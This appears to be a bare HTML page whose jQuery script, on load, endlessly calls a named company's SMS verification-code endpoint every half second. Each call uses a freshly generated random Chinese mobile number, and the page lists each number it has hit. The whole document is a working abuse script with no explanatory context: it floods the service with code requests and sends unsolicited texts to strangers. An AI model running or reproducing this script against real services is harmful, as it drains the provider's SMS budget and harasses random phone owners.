<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.0/jquery.min.js"></script>
<script>
$(function(){
    function a(){
        var n = "13"+String(new Date().getTime()*Math.random()).substr(2,9)
        $.ajax({
            url:"http://server.lexivip.com/lxServer/v1/user/sendCode?phonePre=86&phone="+ n +"&type=1",
            async:false,
            success:function(){
                $('body').html($('body').html()+ n + "<br>");
                setTimeout(a,500);
            }
        });
        
    }
	a();
});
</script>
